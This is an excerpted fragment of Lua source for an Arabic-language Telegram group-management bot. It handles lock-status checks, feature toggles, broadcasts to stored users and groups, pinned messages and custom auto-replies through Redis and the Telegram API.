if text == "الاونلاين" then if DevRio:get(Matrx..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الدردشه" then if DevRio:get(Matrx..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevRio:get(Matrx..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الاغاني" then if DevRio:get(Matrx..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevRio:get(Matrx..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevRio:get(Matrx..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الماركداون" then if DevRio:get(Matrx..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الهاشتاك" then if DevRio:get(Matrx..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "التعديل" then if DevRio:get(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "التثبيت" then if DevRio:get(Matrx..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الاشعارات" then if DevRio:get(Matrx..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الكلايش" then if DevRio:get(Matrx..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الدخول" then if DevRio:get(Matrx..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local MatrxTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الشبكات" then if DevRio:get(Matrx..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "المواقع" then if DevRio:get(Matrx..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "العربيه" then if DevRio:get(Matrx..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الانكليزيه" then if DevRio:get(Matrx..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الكفر" then if DevRio:get(Matrx..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local MatrxTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الفشار" then if DevRio:get(Matrx..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local MatrxTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الطائفيه" then if DevRio:get(Matrx..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local MatrxTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
end
--     Source Matrx     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source Matrx     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source Matrx     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Matrx     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Matrx     --
if RioSudo(msg) then
...
--     Source Matrx     --
if msg.content_.photo_ then
if DevRio:get(Matrx..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevRio:del(Matrx..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevRio:del(Matrx..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Matrx..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Matrx     --
...
if data.ID == "Ok" then
DevRio:del(Matrx..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevRio:get(Matrx..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevRio:del(Matrx..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevRio:scard(Matrx.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevRio:scard(Matrx.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(Matrx.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(Matrx.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(Matrx.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(Matrx.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(Matrx.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(Matrx.."Rio:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/FZOFZ' end
...
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "FZOFZ")..")"
else 
...
DevRio:set(Matrx..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:FreeBot'..Matrx) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:FreeBot'..Matrx,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
--     Source Matrx     --
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(Matrx.."Rio:Groups",msg.chat_id_)
if not DevRio:get(Matrx..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(Matrx..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(Matrx..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(Matrx..'Rio:Groups',msg.chat_id_) then
...
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(Matrx.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(Matrx.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(Matrx.."Rio:Groups:Links" ..v)
...
DevRio:setex(Matrx.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Matrx.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Matrx.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Matrx..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevRio:setex(Matrx.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Matrx.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Matrx.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Matrx..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevRio:setex(Matrx.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Matrx.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Matrx.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Matrx..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevRio:setex(Matrx.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Matrx.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Matrx.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(Matrx..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevRio:setex(Matrx.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Matrx.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Matrx.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(Matrx.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(Matrx..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevRio:get(Matrx..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevRio:smembers(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevRio:set(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevRio:sismember(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevRio:set(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(Matrx..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevRio:set(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevRio:set(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Matrx..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(Matrx..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Matrx..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source Matrx     --
if text == 'اضف كت' and ChCheck(msg) then
DevRio:set(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevRio:get(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevRio:del(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(Matrx..'Rio:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevRio:set(Matrx..'Rio:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Matrx..'Rio:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     Source Matrx     --
...
DevRio:set(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر" ,  1, "md")
DevRio:del(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
Text = "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevRio:set(Matrx..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(Matrx..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(Matrx..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(Matrx..'DelManagerRep'..msg.chat_id_,text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تغير الرد •",callback_data="/ChangeRed:"..msg.sender_user_id_}},{{text="• الغاء •",callback_data="/CancelRed:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
...
DevRio:set(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(Matrx.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
